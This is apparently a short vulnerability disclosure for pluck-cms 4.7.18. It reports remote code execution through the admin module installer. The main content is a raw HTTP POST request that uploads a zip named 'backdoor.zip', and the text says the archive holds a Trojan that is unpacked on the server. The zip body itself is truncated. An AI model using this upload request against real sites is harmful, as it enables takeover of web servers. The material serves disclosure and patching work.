pluck-cms v4.7.18 has a high risk RCE vulnerability

download link:https://github.com/pluck-cms/pluck

version:4.7.18

function point:options=>manage modules=>install modules

![微信图片_20230714104257](https://github.com/nagenanhai/cve/assets/42707759/79a0cbaa-bf76-42e7-a1e1-48978232299b)

```
POST /admin.php?action=installmodule HTTP/1.1
Host: www.pluck.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------280774172131070674951959640897
Content-Length: 1522
Origin: http://www.pluck.com
Connection: close
Referer: http://www.pluck.com/admin.php?action=installmodule
Cookie: PHPSESSID=ha16hdc7lccmjr8eoa5b5nbfv2
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1

-----------------------------280774172131070674951959640897
Content-Disposition: form-data; name="sendfile"; filename="backdoor.zip"
Content-Type: application/x-zip-compressed

PK
-----------------------------280774172131070674951959640897
Content-Disposition: form-data; name="submit"

Upload
-----------------------------280774172131070674951959640897--
```
Upload.zip compressed package. The compressed package contains a Trojan horse. After uploading, the package will automatically decompress and contain the Trojan file.

![image](https://github.com/nagenanhai/cve/assets/42707759/e849276c-e550-4720-b24c-8c4ffa61da28)

